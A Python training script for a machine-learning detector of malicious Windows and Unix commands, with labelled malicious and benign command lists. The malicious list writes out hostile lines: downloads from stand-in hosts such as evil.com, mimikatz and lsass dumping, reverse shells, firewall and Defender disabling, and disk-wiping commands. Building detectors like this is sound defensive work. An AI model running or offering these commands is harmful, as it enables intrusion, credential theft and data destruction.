import os
import json
import pickle
import numpy as np
import pandas as pd
from datetime import datetime
from typing import Dict, List, Tuple, Any
import logging
from collections import defaultdict

# ML Libraries
from sklearn.model_selection import train_test_split
from sklearn.preprocessing import StandardScaler
from sklearn.ensemble import IsolationForest, RandomForestClassifier
from sklearn.metrics import accuracy_score, precision_score, recall_score, f1_score, confusion_matrix
import joblib

# Feature extraction
from sklearn.feature_extraction.text import TfidfVectorizer, CountVectorizer
import re

logger = logging.getLogger(__name__)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

# ============================================================================
# MALICIOUS COMMAND DATASET - Training Data
# ============================================================================

MALICIOUS_COMMANDS = [
    # PowerShell Encoding
    "powershell -enc JABhID0gMjAwMzs=",
    "powershell -EncodedCommand JABhID0gMjAwMzs=",
    "pwsh -e JABhID0gMjAwMzs=",
    "cmd /c powershell -enc JABhID0gMjAwMzs=",
    "powershell.exe -En JABhID0gMjAwMzs=",
    
    # Malware Downloads
    "certutil -download http://evil.com/payload.exe C:\\payload.exe",
    "certutil -urlcache -split -f http://malware.com/mal.exe C:\\temp\\mal.exe",
    "bitsadmin /transfer job /download /priority high http://evil.com/mal.exe C:\\mal.exe",
    "curl http://attacker.com/backdoor.exe | powershell",
    "wget http://evil.com/payload.ps1 -O C:\\payload.ps1",
    
    # Credential Theft
    "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
    "mimikatz \"privilege::debug\" \"token::elevate\" exit",
    "rubeus.exe kerberoast /format:hashcat",
    "laZagne all",
    "procdump -ma lsass.exe C:\\lsass.dmp",
    
    # Registry Persistence
    "reg add HKLM\\Software\\Microsoft\\Windows\\Run /v Malware /d C:\\evil.exe",
    "reg save HKLM\\SAM C:\\sam.hive",
    "reg export HKLM\\SYSTEM C:\\system.hive",
    "regedit /s malicious.reg",
    
    # Service Manipulation
    "sc create EvilService binPath=\"C:\\evil.exe\"",
    "sc start EvilService",
    "sc delete WinDefend",
    "wmic service where name=\"WinDefend\" delete",
    
    # Privilege Escalation
    "takeown /f C:\\Windows /r /d Y",
    "icacls C:\\Windows /grant Everyone:F /t",
    "net localgroup administrators attacker /add",
    "net user hacker Password123 /add",
    
    # Firewall Disabling
    "netsh advfirewall set allprofiles state off",
    "netsh firewall set opmode disable",
    "netsh advfirewall firewall add rule name=backdoor dir=in action=allow",
    
    # File Destruction
    "del /s /q C:\\",
    "cipher /w:C:\\",
    "format C:",
    
    # Scheduled Tasks
    "schtasks /create /tn EvilTask /tr C:\\evil.exe /sc onstart",
    "at 12:00 /every:M C:\\evil.exe",
    
    # Reverse Shells
    "nc.exe -e cmd.exe 192.168.1.100 4444",
    "ncat -e /bin/bash 10.0.0.1 4444",
    "bash -i > /dev/tcp/192.168.1.1/4444 0>&1",
    
    # Process Dumping
    "dump lsass C:\\lsass.dmp",
    "taskkill /f /im svchost.exe",
    
    # Hidden Execution
    "powershell -WindowStyle Hidden -Command \"Get-Process\"",
    "cmd /c start /B C:\\malware.exe >> C:\\log.txt",
    "powershell -w hidden -nop -enc JABhID0gMjAwMzs=",
]

BENIGN_COMMANDS = [
    # Directory and File Operations
    "dir C:\\",
    "dir /s /p C:\\Windows",
    "cd C:\\Users",
    "ls -la /home",
    "pwd",
    "mkdir C:\\NewFolder",
    "copy file.txt C:\\backup\\",
    "move oldname.txt newname.txt",
    "del tempfile.txt",
    "type C:\\config.txt",
    "cat /etc/passwd",
    
    # Network Commands
    "ipconfig",
    "ifconfig",
    "ping google.com",
    "nslookup google.com",
    "tracert google.com",
    "netstat -an",
    "arp -a",
    "route print",
    "ipconfig /all",
    "hostname",
    
    # System Information
    "systeminfo",
    "tasklist",
    "tasklist /v",
    "wmic os get version",
    "ver",
    "echo %PROCESSOR_IDENTIFIER%",
    "cpu info",
    "memory usage",
    
    # File Search and Display
    "findstr /r \"pattern\" file.txt",
    "grep pattern /var/log/auth.log",
    "find . -name \"*.txt\"",
    "dir /s *.log",
    "ls -la",
    "stat file.txt",
    
    # User and Group Management (Legitimate)
    "whoami",
    "id",
    "groups",
    "net user",
    "net group",
    "getent passwd",
    "getent group",
    
    # Service Management (Legitimate)
    "sc query",
    "wmic service list",
    "systemctl list-units",
    "service status",
    "chkconfig --list",
    
    # System Monitoring
    "perfmon",
    "Get-Process",
    "Get-Service",
    "Get-EventLog -LogName Security -Newest 100",
    "ps aux",
    "top -b -n 1",
    "free -h",
    "df -h",
    
    # Registry Queries (Legitimate)
    "reg query HKLM\\Software",
    "reg query HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows",
    "regedit",
    
    # Help and Documentation
    "help dir",
    "powershell -Help",
    "man ls",
    "Get-Help Get-Process",
    "python --version",
    "java -version",
]

# ============================================================================
# FEATURE EXTRACTION
# ============================================================================

class CommandFeatureExtractor:
    """Extract features from commands for ML training"""
    
    def __init__(self):
        self.tfidf_vectorizer = TfidfVectorizer(
            analyzer='char',
            ngram_range=(2, 3),
            max_features=100,
            lowercase=True
        )
        self.count_vectorizer = CountVectorizer(
            analyzer='char',
            ngram_range=(2, 3),
            max_features=100,
            lowercase=True
        )
    
    def extract_basic_features(self, command: str) -> Dict[str, float]:
        """Extract basic statistical features"""
        cmd_lower = command.lower()
        
        return {
            'length': float(len(command)),
            'uppercase_count': sum(1 for c in command if c.isupper()),
            'digit_count': sum(1 for c in command if c.isdigit()),
            'special_char_count': sum(1 for c in command if not c.isalnum() and c != ' '),
            'space_count': command.count(' '),
            'slash_count': command.count('\\') + command.count('/'),
            'pipe_count': command.count('|'),
            'quote_count': command.count('"') + command.count("'"),
        }
    
    def _calculate_entropy(self, data: str) -> float:
        """Calculate Shannon entropy"""
        if len(data) == 0:
            return 0.0
        
        entropy = 0.0
        for char in set(data):
            p = data.count(char) / len(data)
            entropy -= p * np.log2(p)
        
        return float(entropy)
    
    def extract_all_features(self, command: str) -> np.ndarray:
        """Extract all features as vector"""
        basic = self.extract_basic_features(command)
        basic_vector = np.array(list(basic.values()), dtype=np.float32)
        
        return basic_vector

# ============================================================================
# MODEL TRAINING
# ============================================================================

class CMDDetectorAIModel:
    """Train and manage AI models for command detection"""
    
    def __init__(self, model_type='isolation_forest'):
        """
        Initialize AI model trainer
        
        Args:
            model_type: 'isolation_forest' or 'random_forest'
        """
        self.model_type = model_type
        self.model = None
        self.scaler = None
        self.feature_extractor = CommandFeatureExtractor()
        self.training_history = []
        self.metrics = {}
        
        logger.info(f"✅ Initialized AI Model Trainer (type: {model_type})")
    
    def prepare_training_data(self) -> Tuple[np.ndarray, np.ndarray]:
        """Prepare training dataset"""
        logger.info("📊 Preparing training dataset...")
        
        X_list = []
        y_list = []
        
        # Extract features from malicious commands
        logger.info(f"  📍 Processing {len(MALICIOUS_COMMANDS)} malicious samples...")
        for cmd in MALICIOUS_COMMANDS:
            features = self.feature_extractor.extract_all_features(cmd)
            X_list.append(features)
            y_list.append(1)  # Malicious = 1
        
        # Extract features from benign commands
        logger.info(f"  📍 Processing {len(BENIGN_COMMANDS)} benign samples...")
        for cmd in BENIGN_COMMANDS:
            features = self.feature_extractor.extract_all_features(cmd)
            X_list.append(features)
            y_list.append(0)  # Benign = 0
        
        X = np.array(X_list, dtype=np.float32)
        y = np.array(y_list, dtype=np.int32)
        
        logger.info(f"✅ Dataset prepared: {X.shape[0]} samples, {X.shape[1]} features")
        logger.info(f"   - Malicious: {sum(y)} samples")
        logger.info(f"   - Benign: {len(y) - sum(y)} samples")
        
        return X, y
    
    def train(self) -> Dict[str, Any]:
        """Train the model"""
        logger.info("=" * 80)
        logger.info("🤖 STARTING AI MODEL TRAINING")
        logger.info("=" * 80)
        
        # Prepare data
        X, y = self.prepare_training_data()
        
        # Split data
        logger.info("📊 Splitting data: 80% train, 20% test...")
        X_train, X_test, y_train, y_test = train_test_split(
            X, y, test_size=0.2, random_state=42, stratify=y
        )
        
        # Scale features
        logger.info("📏 Scaling features...")
        self.scaler = StandardScaler()
        X_train_scaled = self.scaler.fit_transform(X_train)
        X_test_scaled = self.scaler.transform(X_test)
        
        # Train model
        logger.info(f"🚀 Training {self.model_type} model...")
        
        if self.model_type == 'isolation_forest':
            self.model = IsolationForest(
                contamination=0.2,  # Expected proportion of anomalies
                random_state=42,
                n_estimators=100
            )
            self.model.fit(X_train_scaled)
            
            # Predict
            y_pred = self.model.predict(X_test_scaled)
            y_pred = np.where(y_pred == -1, 1, 0)  # Convert: -1→malicious, 1→benign
            
        elif self.model_type == 'random_forest':
            self.model = RandomForestClassifier(
                n_estimators=100,
                max_depth=15,
                random_state=42,
                n_jobs=-1
            )
            self.model.fit(X_train_scaled, y_train)
            y_pred = self.model.predict(X_test_scaled)
        
        else:
            raise ValueError(f"Unknown model type: {self.model_type}")
        
        # Calculate metrics
        logger.info("📈 Calculating metrics...")
        accuracy = accuracy_score(y_test, y_pred)
        precision = precision_score(y_test, y_pred, zero_division=0)
        recall = recall_score(y_test, y_pred, zero_division=0)
        f1 = f1_score(y_test, y_pred, zero_division=0)
        
        conf_matrix = confusion_matrix(y_test, y_pred)
        
        self.metrics = {
            'accuracy': float(accuracy),
            'precision': float(precision),
            'recall': float(recall),
            'f1_score': float(f1),
            'confusion_matrix': conf_matrix.tolist(),
            'train_samples': len(X_train),
            'test_samples': len(X_test),
            'timestamp': datetime.now().isoformat()
        }
        
        # Log results
        logger.info("=" * 80)
        logger.info("✅ TRAINING COMPLETE")
        logger.info("=" * 80)
        logger.info(f"📊 Accuracy:  {accuracy*100:.2f}%")
        logger.info(f"📊 Precision: {precision*100:.2f}%")
        logger.info(f"📊 Recall:    {recall*100:.2f}%")
        logger.info(f"📊 F1-Score:  {f1*100:.2f}%")
        logger.info("=" * 80)
        
        return {
            'status': 'success',
            'model_type': self.model_type,
            'metrics': self.metrics,
            'confusion_matrix': conf_matrix.tolist()
        }
    
    def save_model(self, model_path='isoforest_model.pkl', scaler_path='isoforest_scaler.pkl'):
        """Save trained model and scaler"""
        if self.model is None:
            logger.error("❌ No model to save. Train first!")
            return False
        
        try:
            logger.info(f"💾 Saving model to {model_path}...")
            joblib.dump(self.model, model_path)
            logger.info(f"✅ Model saved")
            
            logger.info(f"💾 Saving scaler to {scaler_path}...")
            joblib.dump(self.scaler, scaler_path)
            logger.info(f"✅ Scaler saved")
            
            logger.info(f"💾 Saving metrics...")
            with open('model_metrics.json', 'w') as f:
                json.dump(self.metrics, f, indent=2)
            logger.info(f"✅ Metrics saved")
            
            return True
        
        except Exception as e:
            logger.error(f"❌ Save failed: {e}")
            return False
    
    def load_model(self, model_path='isoforest_model.pkl', scaler_path='isoforest_scaler.pkl'):
        """Load pre-trained model"""
        try:
            logger.info(f"📂 Loading model from {model_path}...")
            self.model = joblib.load(model_path)
            logger.info(f"✅ Model loaded")
            
            logger.info(f"📂 Loading scaler from {scaler_path}...")
            self.scaler = joblib.load(scaler_path)
            logger.info(f"✅ Scaler loaded")
            
            return True
        
        except Exception as e:
            logger.error(f"❌ Load failed: {e}")
            return False
    
    def predict(self, command: str) -> Dict[str, Any]:
        """Predict if command is malicious"""
        if self.model is None or self.scaler is None:
            logger.error("❌ Model not trained or loaded")
            return {'error': 'Model not available'}
        
        try:
            features = self.feature_extractor.extract_all_features(command)
            features_scaled = self.scaler.transform([features])
            
            if self.model_type == 'isolation_forest':
                prediction = self.model.predict(features_scaled)[0]
                is_malicious = (prediction == -1)  # -1 = anomaly/malicious
                confidence = float(abs(self.model.score_samples(features_scaled)[0]))
                
            else:  # random_forest
                prediction = self.model.predict(features_scaled)[0]
                is_malicious = (prediction == 1)
                confidence = float(max(self.model.predict_proba(features_scaled)[0]))
            
            return {
                'command': command,
                'is_malicious': bool(is_malicious),
                'confidence': float(confidence),
                'prediction': int(prediction)
            }
        
        except Exception as e:
            logger.error(f"❌ Prediction error: {e}")
            return {'error': str(e)}
    
    def batch_predict(self, commands: List[str]) -> List[Dict[str, Any]]:
        """Predict multiple commands"""
        return [self.predict(cmd) for cmd in commands]

# ============================================================================
# MAIN EXECUTION
# ============================================================================

if __name__ == '__main__':
    logger.info("🚀 CMD DETECTOR - AI TRAINING MODULE")
    logger.info("=" * 80)
    
    # Initialize trainer
    trainer = CMDDetectorAIModel(model_type='isolation_forest')
    
    # Train model
    results = trainer.train()
    
    # Save model
    trainer.save_model()
    
    # Test on sample commands
    logger.info("\n" + "=" * 80)
    logger.info("🧪 TESTING PREDICTIONS")
    logger.info("=" * 80)
    
    test_commands = [
        "powershell -enc JABhID0gMjAwMzs=",
        "dir C:\\",
        "certutil -download http://evil.com/mal.exe",
        "systeminfo",
        "net user hacker Password123 /add",
    ]
    
    for cmd in test_commands:
        pred = trainer.predict(cmd)
        status = "🔴 MALICIOUS" if pred['is_malicious'] else "🟢 BENIGN"
        confidence = pred['confidence'] * 100
        logger.info(f"{status} | {confidence:.2f}% | {cmd[:60]}")
    
    logger.info("=" * 80)
    logger.info("✅ TRAINING COMPLETE - Models saved!")
    logger.info("=" * 80)